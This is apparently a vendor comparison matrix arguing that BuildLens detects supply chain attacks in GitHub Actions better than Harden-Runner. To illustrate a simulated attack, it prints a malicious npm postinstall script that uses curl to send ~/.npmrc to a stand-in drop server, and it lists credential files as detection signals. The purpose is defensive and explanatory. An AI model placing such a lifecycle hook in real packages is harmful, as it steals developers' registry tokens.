# BuildLens vs Harden-Runner: Differentiation & Proof Matrix

**Objective:** Document the empirical difference between StepSecurity Harden-Runner and BuildLens when observing supply chain attacks in GitHub Actions runners.

---

## The Core Differentiator

| Capability | Harden-Runner | BuildLens |
|---|---|---|
| **Primary Signal** | Outbound network calls by top-level process name (e.g. `node` or `curl`) | Causal correlation: `dependency/action → process chain → sensitive file → network destination` |
| **Dependency Attribution** | ❌ None. Sees `node` contacted an IP, cannot identify which of 400 dependencies in `node_modules` was executing | ✅ Exact. Identifies package name, version, lifecycle script (`postinstall`), and lockfile hash |
| **Credential Access Context**| ❌ None. Egress alerts are blind to whether a sensitive credential file (`.env`, `~/.npmrc`, `~/.aws/credentials`) was read prior to the connection | ✅ Proven taint. Tracks when a process reads secrets and propagates that taint across parent-child forks (`node → sh → curl`) |
| **Developer Actionability** | *"Process `node` made an unexpected call to 93.184.216.34:443"* → Developer must audit hundreds of packages or allowlist the IP | *"Package `malicious-dep@1.2.3` (`postinstall`) read `~/.npmrc` and spawned `curl` to 93.184.216.34:443"* → Action: `npm uninstall malicious-dep` |

---

## Simulated Attack Walkthrough

### Scenario: Compromised npm Dependency Exfiltrating npm Tokens
In a typical supply chain attack, an attacker publishes an update to an indirect dependency (or typo-squatted package). During `npm ci`, npm triggers the package's lifecycle script:

```json
{
  "scripts": {
    "postinstall": "sh -c 'curl -s -X POST -d @~/.npmrc https://api.drop-server.example/upload'"
  }
}
```

### What Harden-Runner Reports
```text
Outbound Network Traffic Detected:
Process: curl
Destination: api.drop-server.example (198.51.100.42:443)
Status: Allowed (in audit mode) / Blocked (in block mode)
```
**The Problem:**
1. The AppSec team does not know *why* `curl` was called. Many build tools legitimately download binaries (e.g. `esbuild`, `puppeteer`, `node-gyp`).
2. The report does not mention that `~/.npmrc` was accessed.
3. The report cannot pinpoint which package initiated the call.

---

### What BuildLens Reports in the PR

```text
Critical: dependency credential access

Package: malicious-dep@1.2.3
Lifecycle: postinstall
Sensitive file: ~/.npmrc (package_token)
Process chain: npm → node → sh → curl
Destination: api.drop-server.example
Elapsed time: 43 ms
Confidence: confirmed (lockfile hash verified)

Recommended action:
npm uninstall malicious-dep && npm install --package-lock-only
```

---

## Why This Matters Commercially

A security alert in CI that does not name the offending package requires hours of triage:
1. Digging through build logs looking for who ran `curl`.
2. Inspecting `package-lock.json` diffs.
3. Guessing whether the network call was a legitimate tool download or an exfiltration attack.

BuildLens provides deterministic causality:
It only fires when a **sensitive file read** is causally linked to an **outbound network destination**, and it names the exact package responsible.
